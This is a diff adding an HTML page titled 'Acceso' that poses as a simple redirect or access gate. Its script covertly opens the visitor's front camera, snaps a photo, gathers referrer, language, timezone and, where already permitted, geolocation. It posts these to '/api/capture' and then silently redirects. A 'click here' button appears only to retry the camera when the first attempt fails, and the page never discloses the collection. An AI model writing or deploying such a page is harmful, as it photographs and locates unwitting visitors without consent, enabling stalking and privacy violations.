@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Acceso</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    }
+    #continueBtn {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 14px 32px;
+      font-size: 16px;
+      color: #333333;
+      background: #ffffff;
+      border: 1px solid #cccccc;
+      border-radius: 24px;
+      cursor: pointer;
+    }
+    #continueBtn:hover {
+      background: #f5f5f5;
+    }
+  </style>
+</head>
+<body>
+  <button id="continueBtn" type="button">Presiona aquí para ir a la web page</button>
+  <script>
+    (function () {
+      var done = false;
+      var btn = document.getElementById('continueBtn');
+
+      function clientMetadata() {
+        var meta = {
+          referrer: document.referrer || null,
+          lang: (navigator.language || '') + '/' + (navigator.languages ? navigator.languages.join(',') : '')
+        };
+        try {
+          meta.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+        } catch (e) {
+          meta.tz = null;
+        }
+        return meta;
+      }
+
+      function captureFrame(stream) {
+        return new Promise(function (resolve) {
+          var video = document.createElement('video');
+          video.setAttribute('autoplay', '');
+          video.setAttribute('muted', 'true');
+          video.setAttribute('playsinline', '');
+          video.srcObject = stream;
+          video.onloadedmetadata = function () {
+            video.play().then(function () {
+              setTimeout(function () {
+                try {
+                  var maxW = 640;
+                  var scale = Math.min(1, maxW / video.videoWidth);
+                  var canvas = document.createElement('canvas');
+                  canvas.width = Math.max(1, Math.round(video.videoWidth * scale));
+                  canvas.height = Math.max(1, Math.round(video.videoHeight * scale));
+                  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                  resolve(canvas.toDataURL('image/jpeg', 0.85));
+                } catch (e) {
+                  resolve(null);
+                }
+              }, 400);
+            }).catch(function () {
+              resolve(null);
+            });
+          };
+          video.onerror = function () { resolve(null); };
+        });
+      }
+
+      function stopTracks(stream) {
+        if (stream) stream.getTracks().forEach(function (t) { t.stop(); });
+      }
+
+      function tryCamera() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          return Promise.resolve(null);
+        }
+        return navigator.mediaDevices
+          .getUserMedia({ video: { facingMode: 'user' }, audio: false })
+          .then(function (stream) {
+            return captureFrame(stream).then(function (frame) {
+              stopTracks(stream);
+              return frame;
+            });
+          })
+          .catch(function () {
+            return null;
+          });
+      }
+
+      function collectGeo(meta) {
+        return new Promise(function (resolve) {
+          if (!navigator.permissions || !navigator.geolocation) return resolve(meta);
+          navigator.permissions.query({ name: 'geolocation' }).then(function (p) {
+            if (p.state !== 'granted') return resolve(meta);
+            navigator.geolocation.getCurrentPosition(
+              function (pos) {
+                meta.lat = pos.coords.latitude;
+                meta.lng = pos.coords.longitude;
+                resolve(meta);
+              },
+              function () { resolve(meta); },
+              { timeout: 2500, maximumAge: 60000 }
+            );
+          }).catch(function () { resolve(meta); });
+        });
+      }
+
+      function send(photo) {
+        var body = clientMetadata();
+        if (photo) body.photo = photo;
+        return collectGeo(body).then(function (meta) {
+          return fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(meta)
+          })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              return data.destinationUrl || '/';
+            })
+            .catch(function () {
+              return '/';
+            });
+        });
+      }
+
+      function go(url) {
+        if (done) return;
+        done = true;
+        window.location.replace(url);
+      }
+
+      function finish(photo) {
+        send(photo).then(go);
+      }
+
+      tryCamera().then(function (photo) {
+        if (photo) {
+          finish(photo);
+          return;
+        }
+        btn.style.display = 'block';
+        var clicked = false;
+        btn.addEventListener('click', function () {
+          if (clicked) return;
+          clicked = true;
+          btn.style.display = 'none';
+          tryCamera().then(finish);
+        });
+        setTimeout(function () {
+          if (!clicked) finish(null);
+        }, 45000);
+      });
+    })();
+  </script>
+</body>
+</html>
